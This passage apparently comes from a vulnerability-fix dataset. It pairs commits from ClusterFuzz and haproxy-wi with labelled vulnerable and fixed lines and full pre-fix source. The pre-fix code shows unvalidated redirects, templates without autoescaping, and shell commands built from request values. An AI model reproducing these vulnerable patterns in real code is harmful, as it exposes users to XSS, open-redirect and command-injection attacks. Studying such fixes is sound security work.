helpers.get_user_email()\n    if not user_email:\n      self.redirect(login_url)\n      return\n\n    contact_string = db_config.get_value('contact_string')\n    template_values = {\n        'message': message,\n        'user_email': helpers.get_user_email(),\n        'login_url': login_url,\n        'switch_account_url': login_url,\n        'logout_url': make_logout_url(dest_url=self.request.url),\n        'contact_string': contact_string,\n    }\n    self.render('error-403.html', template_values, 403)\n\n  def _add_security_response_headers(self):\n    \"\"\"Add security-related headers to response.\"\"\"\n    self.response.headers['Strict-Transport-Security'] = (\n        'max-age=2592000; includeSubdomains')\n    self.response.headers['X-Content-Type-Options'] = 'nosniff'\n    self.response.headers['X-Frame-Options'] = 'deny'\n\n  def render(self, path, values=None, status=200):\n    \"\"\"Write HTML response.\"\"\"\n    if values is None:\n      values = {}\n\n    values['menu_items'] = _MENU_ITEMS\n    values['is_oss_fuzz'] = utils.is_oss_fuzz()\n    values['is_development'] = (\n        environment.is_running_on_app_engine_development())\n    values['is_logged_in'] = bool(helpers.get_user_email())\n\n    # Only track analytics for non-admin users.\n    values['ga_tracking_id'] = (\n        local_config.GAEConfig().get('ga_tracking_id')\n        if not auth.is_current_user_admin() else None)\n\n    if values['is_logged_in']:\n      values['switch_account_url'] = make_login_url(self.request.url)\n      values['logout_url'] = make_logout_url(dest_url=self.request.url)\n\n    template = _JINJA_ENVIRONMENT.get_template(path)\n\n    self._add_security_response_headers()\n    self.response.headers['Content-Type'] = 'text/html'\n    self.response.out.write(template.render(values))\n    self.response.set_status(status)\n\n  def before_render_json(self, values, status):\n    \"\"\"A hook for modifying values before render_json.\"\"\"\n\n  def render_json(self, values, status=200):\n    \"\"\"Write JSON response.\"\"\"\n    self._add_security_response_headers()\n    self.response.headers['Content-Type'] = 'application/json'\n    self.before_render_json(values, status)\n    self.response.out.write(json.dumps(values, cls=JsonEncoder))\n    self.response.set_status(status)\n\n  def handle_exception(self, exception, _):\n    \"\"\"Catch exception and format it properly.\"\"\"\n    try:\n\n      status = 500\n      values = {\n          'message': exception.message,\n          'email': helpers.get_user_email(),\n          'traceDump': traceback.format_exc(),\n          'status': status,\n          'type': exception.__class__.__name__\n      }\n      if isinstance(exception, helpers.EarlyExitException):\n        status = exception.status\n        values = exception.to_dict()\n      values['params'] = self.request.params.dict_of_lists()\n\n      # 4XX is not our fault. Therefore, we hide the trace dump and log on\n      # the INFO level.\n      if status >= 400 and status <= 499:\n        logging.info(json.dumps(values, cls=JsonEncoder))\n        del values['traceDump']\n      else:  # Other error codes should be logged with the EXCEPTION level.\n        logging.exception(exception)\n\n      if helpers.should_render_json(\n          self.request.headers.get('accept', ''),\n          self.response.headers.get('Content-Type')):\n        self.render_json(values, status)\n      else:\n        if status == 403 or status == 401:\n          self.render_forbidden(exception.message)\n        else:\n          self.render('error.html', values, status)\n    except Exception:\n      self.handle_exception_exception()\n\n  def handle_exception_exception(self):\n    \"\"\"Catch exception in handle_exception and format it properly.\"\"\"\n    exception = sys.exc_info()[1]\n    values = {'message': exception.message, 'traceDump': traceback.format_exc()}\n    logging.exception(exception)\n    if helpers.should_render_json(\n        self.request.headers.get('accept', ''),\n        self.response.headers.get('Content-Type')):\n      self.render_json(values, 500)\n    else:\n      self.render('error.html', values, 500)\n\n  def redirect(self, url, **kwargs):\n    \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect\n    strongly requires 'str' but url might be an unicode string.\"\"\"\n    super(Handler, self).redirect(str(url), **kwargs)\n\n\nclass GcsUploadHandler(Handler):\n  \"\"\"A handler which uploads files to GCS.\"\"\"\n\n  def __init__(self, request, response):\n    self.initialize(request, response)\n    self.upload = None\n\n  def get_upload(self):\n    \"\"\"Get uploads.\"\"\"\n    if self.upload:\n      return self.upload\n\n    upload_key = self.request.get('upload_key')\n    if not upload_key:\n      return None\n\n    blob_info = storage.GcsBlobInfo.from_key(upload_key)\n    if not blob_info:\n      raise helpers.EarlyExitException('Failed to upload.', 500)\n\n    self.upload = blob_info\n    return self.upload\n"
                },
                "/src/appengine/handlers/login.py": {
                    "changes": [
                        {
                            "diff": "\n   @handler.get(handler.HTML)\n   def get(self):\n     \"\"\"Handle a get request.\"\"\"\n+    dest = self.request.get('dest')\n+    base_handler.check_redirect_url(dest)\n+\n     self.render(\n         'login.html', {\n             'apiKey': local_config.ProjectConfig().get('firebase.api_key'),\n             'authDomain': auth.auth_domain(),\n-            'dest': self.request.get('dest'),\n+            'dest': dest,\n         })\n \n",
                            "add": 4,
                            "remove": 1,
                            "filename": "/src/appengine/handlers/login.py",
                            "badparts": [
                                "            'dest': self.request.get('dest'),"
                            ],
                            "goodparts": [
                                "    dest = self.request.get('dest')",
                                "    base_handler.check_redirect_url(dest)",
                                "            'dest': dest,"
                            ]
                        }
                    ],
                    "source": "\n \"\"\"Login page.\"\"\" import datetime from config import local_config from handlers import base_handler from libs import auth from libs import handler from libs import helpers from metrics import logs SESSION_EXPIRY_DAYS=14 class Handler(base_handler.Handler): \"\"\"Login page.\"\"\" @handler.unsupported_on_local_server @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" self.render( 'login.html',{ 'apiKey': local_config.ProjectConfig().get('firebase.api_key'), 'authDomain': auth.auth_domain(), 'dest': self.request.get('dest'), }) class SessionLoginHandler(base_handler.Handler): \"\"\"Session login handler.\"\"\" @handler.post(handler.JSON, handler.JSON) def post(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token, expires_in) except auth.AuthError: raise helpers.EarlyExitException('Failed to create session cookie.', 401) expires=datetime.datetime.now() +expires_in self.response.set_cookie( 'session', session_cookie, expires=expires, httponly=True, secure=True, overwrite=True) self.render_json({'status': 'success'}) class LogoutHandler(base_handler.Handler): \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" try: auth.revoke_session_cookie(auth.get_session_cookie()) except auth.AuthError: logs.log_error('Failed to revoke session cookie.') self.response.delete_cookie('session') self.redirect(self.request.get('dest')) ",
                    "sourceWithComments": "# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Login page.\"\"\"\n\nimport datetime\n\nfrom config import local_config\nfrom handlers import base_handler\nfrom libs import auth\nfrom libs import handler\nfrom libs import helpers\nfrom metrics import logs\n\nSESSION_EXPIRY_DAYS = 14\n\n\nclass Handler(base_handler.Handler):\n  \"\"\"Login page.\"\"\"\n\n  @handler.unsupported_on_local_server\n  @handler.get(handler.HTML)\n  def get(self):\n    \"\"\"Handle a get request.\"\"\"\n    self.render(\n        'login.html', {\n            'apiKey': local_config.ProjectConfig().get('firebase.api_key'),\n            'authDomain': auth.auth_domain(),\n            'dest': self.request.get('dest'),\n        })\n\n\nclass SessionLoginHandler(base_handler.Handler):\n  \"\"\"Session login handler.\"\"\"\n\n  @handler.post(handler.JSON, handler.JSON)\n  def post(self):\n    \"\"\"Handle a post request.\"\"\"\n    id_token = self.request.get('idToken')\n    expires_in = datetime.timedelta(days=SESSION_EXPIRY_DAYS)\n    try:\n      session_cookie = auth.create_session_cookie(id_token, expires_in)\n    except auth.AuthError:\n      raise helpers.EarlyExitException('Failed to create session cookie.', 401)\n\n    expires = datetime.datetime.now() + expires_in\n    self.response.set_cookie(\n        'session',\n        session_cookie,\n        expires=expires,\n        httponly=True,\n        secure=True,\n        overwrite=True)\n    self.render_json({'status': 'success'})\n\n\nclass LogoutHandler(base_handler.Handler):\n  \"\"\"Log out handler.\"\"\"\n\n  @handler.unsupported_on_local_server\n  @handler.require_csrf_token\n  @handler.get(handler.HTML)\n  def get(self):\n    \"\"\"Handle a get request.\"\"\"\n    try:\n      auth.revoke_session_cookie(auth.get_session_cookie())\n    except auth.AuthError:\n      # Even if the revoke failed, remove the cookie.\n      logs.log_error('Failed to revoke session cookie.')\n\n    self.response.delete_cookie('session')\n    self.redirect(self.request.get('dest'))\n"
                }
            },
            "msg": "Fix XSS with redirects. (#874)"
        }
    },
    "https://github.com/Aidaho12/haproxy-wi": {
        "ba79e7301c5574b91b719298c56fd5129c46cca3": {
            "url": "https://api.github.com/repos/Aidaho12/haproxy-wi/commits/ba79e7301c5574b91b719298c56fd5129c46cca3",
            "html_url": "https://github.com/Aidaho12/haproxy-wi/commit/ba79e7301c5574b91b719298c56fd5129c46cca3",
            "sha": "ba79e7301c5574b91b719298c56fd5129c46cca3",
            "keyword": "XSS protect",
            "diff": "diff --git a/app/config.py b/app/config.py\nindex 8c2ae80..e994424 100644\n--- a/app/config.py\n+++ b/app/config.py\n@@ -5,7 +5,7 @@\n import funct\n import sql\n from jinja2 import Environment, FileSystemLoader\n-env = Environment(loader=FileSystemLoader('templates/'))\n+env = Environment(loader=FileSystemLoader('templates/'), autoescape=True)\n template = env.get_template('config.html')\n \n print('Content-type: text/html\\n')\ndiff --git a/app/funct.py b/app/funct.py\nindex 79c972b..336c154 100644\n--- a/app/funct.py\n+++ b/app/funct.py\n@@ -137,7 +137,7 @@ def page_for_admin(**kwargs):\n \tgive_level = 1\n \tgive_level = kwargs.get(\"level\")\n \t\t\n-\tif not is_admin(level = give_level):\n+\tif not is_admin(level=give_level):\n \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>')\n \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">')\n \t\timport sys\ndiff --git a/app/options.py b/app/options.py\nindex 7993295..87ca0e9 100644\n--- a/app/options.py\n+++ b/app/options.py\n@@ -295,7 +295,7 @@\n if act == \"showCompareConfigs\":\n \timport glob\n \tfrom jinja2 import Environment, FileSystemLoader\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True)\n \ttemplate = env.get_template('/show_compare_configs.html')\n \tleft = form.getvalue('left')\n \tright = form.getvalue('right')\n@@ -309,7 +309,7 @@\n \tright = form.getvalue('right')\n \thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n \tcmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)\t\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n \ttemplate = env.get_template('compare.html')\n \t\n \toutput, stderr = funct.subprocess_execute(cmd)\n@@ -329,11 +329,13 @@\n \t\t\t\n \ttry:\n \t\tconf = open(cfg, \"r\")\n+\t\t#conf = conf.read()\n+\t\t#conf = funct.escape_html(conf)\n \texcept IOError:\n \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>')\n \t\t\n \tfrom jinja2 import Environment, FileSystemLoader\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols'])\n \ttemplate = env.get_template('config_show.html')\n \t\n \ttemplate = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t\ndiff --git a/app/templates/base.html b/app/templates/base.html\nindex a11c42d..ab5fdb3 100644\n--- a/app/templates/base.html\n+++ b/app/templates/base.html\n@@ -115,7 +115,7 @@\n \t\t\t\t\t</ul>\n \t\t\t\t</nav>\n \t\t\t\t<div class=\"copyright-menu\">\n-\t\t\t\t\t<a href=\"https://github.com/aidaho12/haproxy-wi/\" title=\"Github repo\" target=\"_blank\" style=\"color: #fff\">HAproxy-WI v3.4.4.4</a>\n+\t\t\t\t\t<a href=\"https://github.com/aidaho12/haproxy-wi/\" title=\"Github repo\" target=\"_blank\" style=\"color: #fff\">HAproxy-WI v3.4.4.5</a>\n \t\t\t\t\t<br>\n \t\t\t\t\t<a href=\"https://www.patreon.com/haproxy_wi\" title=\"Donate\" target=\"_blank\" style=\"color: #fff; margin-left: 30px; color: red;\" class=\"patreon\">  Patreon</a>\n \t\t\t\t</div>\n",
            "message": "",
            "files": {
                "/app/config.py": {
                    "changes": [
                        {
                            "diff": "\n import funct\n import sql\n from jinja2 import Environment, FileSystemLoader\n-env = Environment(loader=FileSystemLoader('templates/'))\n+env = Environment(loader=FileSystemLoader('templates/'), autoescape=True)\n template = env.get_template('config.html')\n \n print('Content-type: text/html\\n')",
                            "add": 1,
                            "remove": 1,
                            "filename": "/app/config.py",
                            "badparts": [
                                "env = Environment(loader=FileSystemLoader('templates/'))"
                            ],
                            "goodparts": [
                                "env = Environment(loader=FileSystemLoader('templates/'), autoescape=True)"
                            ]
                        }
                    ],
                    "source": "\n\nimport cgi import os import http.cookies import funct import sql from jinja2 import Environment, FileSystemLoader env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv') config_read=\"\" cfg=\"\" stderr=\"\" error=\"\" aftersave=\"\" try: \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \tuser=sql.get_user_name_by_uuid(user_id.value) \tservers=sql.get_dick_permit() \ttoken=sql.get_token(user_id.value) \trole=sql.get_user_role_by_uuid(user_id.value) except: \tpass hap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') if serv is not None: \tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg) \t \t \t \t \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir +\"*.old\") template=template.render(h2=1, title=\"Working with HAProxy configs\", \t\t\t\t\t\t\trole=role, \t\t\t\t\t\t\taction=\"config.py\", \t\t\t\t\t\t\tuser=user, \t\t\t\t\t\t\tselect_id=\"serv\", \t\t\t\t\t\t\tserv=serv, \t\t\t\t\t\t\taftersave=aftersave, \t\t\t\t\t\t\tconfig=config_read, \t\t\t\t\t\t\tcfg=cfg, \t\t\t\t\t\t\tselects=servers, \t\t\t\t\t\t\tstderr=stderr, \t\t\t\t\t\t\terror=error, \t\t\t\t\t\t\tnote=1, \t\t\t\t\t\t\ttoken=token) print(template) ",
                    "sourceWithComments": "#!/usr/bin/env python3\nimport cgi\nimport os\nimport http.cookies\nimport funct\nimport sql\nfrom jinja2 import Environment, FileSystemLoader\nenv = Environment(loader=FileSystemLoader('templates/'))\ntemplate = env.get_template('config.html')\n\nprint('Content-type: text/html\\n')\nfunct.check_login()\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\nconfig_read = \"\"\ncfg = \"\"\nstderr = \"\"\nerror = \"\"\naftersave = \"\"\n\ntry:\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\n\tuser = sql.get_user_name_by_uuid(user_id.value)\n\tservers = sql.get_dick_permit()\n\ttoken = sql.get_token(user_id.value)\n\trole = sql.get_user_role_by_uuid(user_id.value)\nexcept:\n\tpass\n\nhap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\nif serv is not None:\n\tcfg = hap_configs_dir + serv + \"-\" + funct.get_data('config') + \".cfg\"\n\nif serv is not None and form.getvalue('open') is not None :\n\t\n\ttry:\n\t\tfunct.logging(serv, \"config.py open config\")\n\texcept:\n\t\tpass\n\t\n\terror = funct.get_config(serv, cfg)\n\t\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\t\tconfig_read = conf.read()\n\t\tconf.close\n\texcept IOError:\n\t\terror += '<br />Can\\'t read import config file'\n\n\tos.system(\"/bin/mv %s %s.old\" % (cfg, cfg))\t\n\nif serv is not None and form.getvalue('config') is not None:\n\ttry:\n\t\tfunct.logging(serv, \"config.py edited config\")\n\texcept:\n\t\tpass\n\t\t\n\tconfig = form.getvalue('config')\n\toldcfg = form.getvalue('oldconfig')\n\tsave = form.getvalue('save')\n\taftersave = 1\n\ttry:\n\t\twith open(cfg, \"a\") as conf:\n\t\t\tconf.write(config)\n\texcept IOError:\n\t\terror = \"Can't read import config file\"\n\t\n\tMASTERS = sql.is_master(serv)\n\tfor master in MASTERS:\n\t\tif master[0] != None:\n\t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save)\n\t\t\n\tstderr = funct.upload_and_restart(serv, cfg, just_save=save)\n\t\t\n\tfunct.diff_config(oldcfg, cfg)\n\t\n\t#if save:\n\t#\tc = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\t#\tc[\"restart\"] = form.getvalue('serv')\n\t#\tprint(c)\n\t\t\n\tos.system(\"/bin/rm -f \" + hap_configs_dir + \"*.old\")\n\n\ntemplate = template.render(h2 = 1, title = \"Working with HAProxy configs\",\n\t\t\t\t\t\t\trole = role,\n\t\t\t\t\t\t\taction = \"config.py\",\n\t\t\t\t\t\t\tuser = user,\n\t\t\t\t\t\t\tselect_id = \"serv\",\n\t\t\t\t\t\t\tserv = serv,\n\t\t\t\t\t\t\taftersave = aftersave,\n\t\t\t\t\t\t\tconfig = config_read,\n\t\t\t\t\t\t\tcfg = cfg,\n\t\t\t\t\t\t\tselects = servers,\n\t\t\t\t\t\t\tstderr = stderr,\n\t\t\t\t\t\t\terror = error,\n\t\t\t\t\t\t\tnote = 1,\n\t\t\t\t\t\t\ttoken = token)\nprint(template)"
                },
                "/app/funct.py": {
                    "changes": [
                        {
                            "diff": "\n \tgive_level = 1\n \tgive_level = kwargs.get(\"level\")\n \t\t\n-\tif not is_admin(level = give_level):\n+\tif not is_admin(level=give_level):\n \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>')\n \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">')\n \t\timport sy",
                            "add": 1,
                            "remove": 1,
                            "filename": "/app/funct.py",
                            "badparts": [
                                "\tif not is_admin(level = give_level):"
                            ],
                            "goodparts": [
                                "\tif not is_admin(level=give_level):"
                            ]
                        }
                    ],
                    "source": "\n\nimport cgi import os, sys form=cgi.FieldStorage() serv=form.getvalue('serv') def get_app_dir(): \td=sys.path[0] \td=d.split('/')[-1]\t\t \treturn sys.path[0] if d==\"app\" else os.path.dirname(sys.path[0])\t def get_config_var(sec, var): \tfrom configparser import ConfigParser, ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir()+\"/haproxy-wi.cfg\" \t\tconfig=ConfigParser(interpolation=ExtendedInterpolation()) \t\tconfig.read(path_config) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>') \ttry: \t\treturn config.get(sec, var) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': \t\tfmt=\"%Y-%m-%d.%H:%M:%S\" \tif type=='logs': \t\tfmt='%Y%m%d' \tif type==\"date_in_log\": \t\tfmt=\"%b %d %H:%M:%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path') \tlogin='' \t \tif not os.path.exists(log_path): \t\tos.makedirs(log_path) \t\t \ttry: \t\tIP=cgi.escape(os.environ[\"REMOTE_ADDR\"]) \t\tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \t\tuser_uuid=cookie.get('uuid') \t\tlogin=sql.get_user_name_by_uuid(user_uuid.value) \texcept: \t\tpass \t\t \tif kwargs.get('alerting')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/checker-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\".log\", \"a\") \telse: \t\tmess=get_data('date_in_log') +\" from \" +IP +\" user: \" +login +\" \" +action +\" for: \" +serv +\"\\n\" \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \ttry:\t \t\tlog.write(mess) \t\tlog.close \texcept IOError as e: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div></center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy') \t \tfor telegram in telegrams: \t\ttoken_bot=telegram[1] \t\tchannel_name=telegram[2] \t\t\t \tif proxy is not None: \t\tapihelper.proxy={'https': proxy} \ttry: \t\tbot=telebot.TeleBot(token=token_bot) \t\tbot.send_message(chat_id=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_uuid=cookie.get('uuid') \tref=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid is not None: \t\tsql.update_last_act_user(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass \tlevel=kwargs.get(\"level\") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <=level else False \texcept: \t\treturn False \t\tpass def page_for_admin(**kwargs): \tgive_level=1 \tgive_level=kwargs.get(\"level\") \t\t \tif not is_admin(level=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">') \t\timport sys \t\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' \tssh_user_name='' \tssh_user_password='' \t \tfor sshs in sql.select_ssh(serv=serv): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql.select_servers(server=serv) \tfor server in servers: \t\tssh_port=server[10] \tssh=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file(ssh_key_name) \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, pkey=k) \t\telse: \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, password=ssh_user_password) \t\treturn ssh \texcept paramiko.AuthenticationException: \t\treturn 'Authentication failed, please verify your credentials' \t\tpass \texcept paramiko.SSHException as sshException: \t\treturn 'Unable to establish SSH connection: %s ' % sshException \t\tpass \texcept paramiko.BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException \t\tpass \texcept Exception as e: \t\tif e==\"No such file or directory\": \t\t\treturn '%s. Check ssh key' % e \t\t\tpass \t\telif e==\"Invalid argument\": \t\t\terror='Check the IP of the server' \t\t\tpass \t\telse: \t\t\terror=e\t \t\t\tpass \t\treturn str(error) def get_config(serv, cfg, **kwargs): \timport sql \tconfig_path=\"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t \tssh=ssh_connect(serv) \ttry: \t\tsftp=ssh.open_sftp() \t\tsftp.get(config_path, cfg) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn ssh \t def diff_config(oldcfg, cfg): \tlog_path=get_config_var('main', 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" \ttry:\t\t \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \t\tlog.write(diff) \t\tlog.close \texcept IOError: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr) \t\tpass \t\t def install_haproxy(serv, **kwargs): \timport sql \tscript=\"install_haproxy.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tstats_port=sql.get_setting('stats_port') \tserver_state_file=sql.get_setting('server_state_file') \tstats_user=sql.get_setting('stats_user') \tstats_password=sql.get_setting('stats_password') \tproxy=sql.get_setting('proxy') \tos.system(\"cp scripts/%s.\" % script) \t \tproxy_serv=proxy if proxy is not None else \"\" \t\t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\t \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t \tif kwargs.get('syn_flood')==\"1\": \t\tsyn_flood_protect(serv) \t def syn_flood_protect(serv, **kwargs): \timport sql \tscript=\"syn_flood_protect.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \t \tenable=\"disable\" if kwargs.get('enable')==\"0\" else \"disable\" \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" \"+enable] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t def waf_install(serv, **kwargs): \timport sql \tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \tproxy=sql.get_setting('proxy') \thaproxy_dir=sql.get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \t \tstderr=ssh_command(serv, commands, print_out=\"1\") \tif stderr is None: \t\tsql.insert_waf_metrics_enable(serv, \"0\") def check_haproxy_version(serv): \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tver=\"\" \tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs): \terror=\"\" \tfull_path=path +file \tif kwargs.get('dir')==\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror=e \t\tpass \t\t \treturn error \t def upload_and_restart(serv, cfg, **kwargs): \timport sql 